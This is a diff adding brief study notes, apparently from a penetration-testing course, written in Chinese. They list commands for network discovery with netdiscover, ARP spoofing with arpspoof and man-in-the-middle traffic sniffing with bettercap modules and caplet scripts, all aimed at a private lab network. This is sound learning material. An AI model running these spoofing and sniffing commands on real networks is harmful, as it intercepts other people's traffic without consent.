@@ -1,0 +1,48 @@
+progress: 9-2
+skip ch5~8 (因為需要wifi adapter)
+
+測試用網站: testhtml5.vulnweb.com
+
+找附近的ip
+netdiscover -r <ip range>
+  netdiscover -r 10.0.2.1/24
+
+
+arpspoof -i <network interface> -t <target ip> <gateway ip>
+arpspoof -i <network interface> -t <gateway ip> <target ip>
+  arpspoof -i eth0 -t 10.0.2.15 10.0.2.1
+  arpspoof -i eth0 -t 10.0.2.1 10.0.2.15
+
+
+這會進入bettercap互動交互介面
+bettercap -iface <network interface>
+  bettercap -iface eth0
+
+列出各種module及其狀態
+help
+
+查詢特定module的用法
+help <module name>
+
+啟動module
+<module name> on
+  arp.spoof on
+
+
+設定選項值
+set <option name> <value>
+  set arp.spoof.fullduplex true
+  set arp.spoof.targets 10.0.2.15
+
+
+監控target (同時跑net.recon net.probe arp.spoof)
+net.sniff on
+
+
+可以把bettercap的指令寫成腳本,副檔名叫cap
+
+用bettercap跑cap腳本
+bettercap -iface eth0 -caplet <cap檔案>
+  bettercap -iface eth0 -caplet spoof.cap
+
+
